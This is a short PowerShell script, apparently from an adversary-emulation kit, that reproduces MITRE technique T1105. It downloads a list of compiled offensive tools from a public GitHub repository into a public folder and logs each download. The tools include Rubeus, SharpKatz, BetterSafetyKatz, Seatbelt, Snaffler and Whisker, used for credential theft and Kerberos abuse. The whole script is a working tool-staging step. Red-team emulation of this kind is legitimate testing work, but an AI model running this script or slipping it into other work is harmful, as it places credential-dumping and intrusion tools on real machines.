# Downloads several compiled attack tools
# Technic ID : T1105
Clear-Host
Write-Output "==============================================================================="
Write-Output "Downloads several compiled attack tools (T1105)"
Write-Output "==============================================================================="
################ [ List of commpiled programs to downlad ] ################
$SoftToDownload = @("Seatbelt.exe","Rubeus.exe","SauronEye.exe","SharpKatz.exe","BetterSafetyKatz.exe","Moriarty.exe","SharpEDRChecker.exe","Snaffler.exe","Whisker.exe","SharpUp.exe","PurpleSharp.exe");
################ [ GLOBAL VARIABLES ] ################
$TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
$DownloadLogFile = "$env:PUBLIC\exf\Tools_Download.txt";
$DestinationPath = "$env:PUBLIC\Toolz\";
################ [ MAIN BODY ] ################
Write-Output "`n" | Out-File -FilePath "$DownloadLogFile" -Encoding utf8 -Force
Write-output "-------------------------------------"  | Out-File -FilePath $DownloadLogFile -Encoding utf8 -Append
Write-output "Script : $PSCommandPath has been launched on $TimeStamp" | Out-File -FilePath $DownloadLogFile -Encoding utf8 -Append
Write-output "-------------------------------------"  | Out-File -FilePath $DownloadLogFile -Encoding utf8 -Append
Write-Output "`n" | Out-File -FilePath "$DownloadLogFile" -Encoding utf8 -Append
foreach ($Tool in $SoftToDownload) 
{
    $DownloadRun = "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/$Tool";
    $DestinationFilename = "$DestinationPath$Tool";
    $web = (New-Object System.Net.WebClient);
    $result = $web.DownloadFile("$DownloadRun", "$DestinationFileName");
    Write-Output "The file $Tool has been successfully downloaded from $DownloadRun and stored to $DestinationFilename" | Out-File -FilePath "$DownloadLogFile" -Append;
  }